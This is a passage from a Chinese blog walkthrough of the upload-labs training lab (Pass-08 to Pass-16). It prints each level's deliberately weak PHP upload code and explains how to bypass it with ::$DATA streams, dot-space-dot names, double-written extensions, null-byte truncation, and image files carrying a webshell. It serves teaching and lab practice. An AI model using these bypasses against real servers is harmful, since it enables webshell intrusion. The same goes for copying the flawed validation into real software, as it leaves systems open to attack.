class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，与前面第七关的代码相比，少了去除文件名的”::$DATA”字符串这一步。这里还是利用windows的一个特性。</p>
<blockquote>
<p>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。</p>
</blockquote>
<p>简单讲就是在php+windows的情况下：如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名.且保持<code>&quot;::$DATA&quot;</code>之前的文件名。</p>
<p><em>注:仅windows适用</em></p>
<h4 id="绕过方法-7"><a href="#绕过方法-7" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>由上分析，可知，用burp将上传文件后缀改为:<code>xx.php::$DATA</code>即可。</p>
<h3 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h3><h4 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA。。但是，这里还是可以绕过的。这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。故可以构造点空格点进行绕过，也就是后缀名改为<code>xx.php. .</code>，也是利用了Windows的特性。也就是说，如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。</p>
<h4 id="绕过方法-8"><a href="#绕过方法-8" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>将后缀名改为<code>xx.php. .</code>即可</p>
<h3 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h3><h4 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里代码没有了之前关卡里的去除文件尾点、空格、::$DATA的操作，估计是针对非Windows系统的。这里存在的问题是，利用str_ireplace对黑名单里的文件后缀名进行了替换，换成空字符，使用了str_ireplace函数，即不区分大小写，故大小写绕过不适用。但是这里替换是替换成了空字符，于是我们可以双写后缀名，如<code>.pphphp</code>,使得替换后的后缀名为php。</p>
<h4 id="绕过方法-9"><a href="#绕过方法-9" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>用burp修改后缀名为 <code>.pphphp</code></p>
<h3 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11 00截断"></a>Pass-11 00截断</h3><h4 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，这里与之前代码相比，使用了白名单，只允许上传，jpg，png，gif三种格式文件。但是在进行move_uploaded_file前。利用<code>GET[&#39;save_path&#39;]</code>和随机时间函数进行拼接，拼接成文件存储路径。这里构造文件存储路径利用了_GET传入，导致服务器最终存储的文件名可控。故可以利用这个点进行绕过。这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到0x00会截断</p>
<blockquote>
<p>截断条件：<br> 1、php版本小于5.3.4<br> 2、php.ini的magic_quotes_gpc为OFF状态</p>
</blockquote>
<h4 id="绕过方法-10"><a href="#绕过方法-10" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>首先确认自己的环境的php版本环境是否符合条件。其次查看php.ini配置文件中的magic_quotes_gpc是否为Off。我这里是php版本换成了5.2</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-7.png" alt="up-7"></p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-8.png" alt="up-8"></p>
<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><h4 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里代码与上面Pass-11代码类似，不过是save_path参数由GET传入变为POST传入，利用原理也是00截断。故这里不再叙述</p>
<h4 id="绕过方法-11"><a href="#绕过方法-11" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>参照Pass-11</p>
<p>还可以使用如下方法</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-23.png" alt="up-23"></p>
<h3 id="Pass-13-图片马-unpack"><a href="#Pass-13-图片马-unpack" class="headerlink" title="Pass-13 图片马 unpack"></a>Pass-13 图片马 unpack</h3><h4 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从这一关开始上传图片马，结合文件包含进行攻击。</p>
<h4 id="绕过方法-12"><a href="#绕过方法-12" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>利用windows的cmd命令制作copy制作图片马<br><code>copy 1.jpg /b + shell.php /a shell.jpg</code><br>制作完图片马后直接上传，然后利用文件包含即可。</p>
<h3 id="Pass-14-图片马-getimagesize"><a href="#Pass-14-图片马-getimagesize" class="headerlink" title="Pass-14 图片马 getimagesize()"></a>Pass-14 图片马 getimagesize()</h3><h4 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里getimagesize()函数解释如下</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-9.png" alt="up-9"></p>
<h4 id="绕过方法-13"><a href="#绕过方法-13" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>与上面一致</p>
<h3 id="Pass-15-exif-imagetype"><a href="#Pass-15-exif-imagetype" class="headerlink" title="Pass-15 exif_imagetype()"></a>Pass-15 exif_imagetype()</h3><h4 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exif_imagetype函数说明如下</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-10.png" alt="up-10"></p>
<h4 id="绕过方法-14"><a href="#绕过方法-14" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>同Pass-13一样，生成图片马上传</p>
<h3 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16 二次渲染绕过"></a>Pass-16 二次渲染绕过</h3><p>参考：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a> 讲的很细</p>
<h4 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span 